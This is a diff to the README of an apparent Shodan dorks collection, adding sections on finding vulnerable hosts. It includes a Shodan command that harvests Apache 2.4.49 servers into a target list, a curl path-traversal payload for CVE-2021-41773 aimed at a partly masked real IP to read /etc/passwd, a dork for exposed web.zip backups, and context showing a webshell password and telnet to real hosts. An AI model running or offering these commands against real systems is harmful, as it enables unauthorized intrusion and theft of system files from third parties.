@@ -144,13 +144,12 @@ run
 ```
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/54060261-80cc-4893-b134-b3fe2e0bc62c)
 
-
 ```sh
 telnet 212.x.x.14
 ```
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5f79db0b-aff5-4790-8c9a-59f0b84c59d4)
 
-## Exploit RCE CVE-2020-0796
+## Exploit Infrastructure RCE CVE-2020-0796
 La vulnerabilidad CVE-2020-0796 se refiere a una vulnerabilidad de ejecución de código remoto (RCE, por sus siglas en inglés) que afecta al protocolo de compartición de archivos SMBv3 (Server Message Block version 3). SMB es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes de computadoras. La versión 3 (SMBv3) es una versión moderna de este protocolo utilizada en sistemas operativos Windows.
 
 Esta vulnerabilidad se conoció coloquialmente como "SMBGhost" o "CoronaBlue" y fue anunciada en marzo de 2020. 
@@ -162,6 +161,18 @@ country:pe port:445
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9719b22e-f451-41ed-8a69-c90917116eee)
 
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5067e96e-1031-413b-87ed-447568d5102b)
+
+## Exploit Web RCE CVE-2021-41773
+```sh
+shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/ec13f8db-9b99-4be4-af6e-5000fd99d1c9)
+
+```sh
+curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/bb853581-a88d-4f88-92b8-1e89461ee0ad)
+
 
 ## Electronic measure
 
@@ -181,6 +192,15 @@ html:"wso.php"
 webshell as default fa769dac7a0a94ee47d8ebe021eaba9e has a match password ghost287
 
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/31ab5b5e-97f8-4512-b08a-76981529067a)
+
+
+## Search Backup Files
+
+```sh
+html:"web.zip"
+"web.zip"
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/6c0e4d42-2378-433e-a4b9-784fb7d5a5b6)
 
 
 ## OS Windows Obsolete
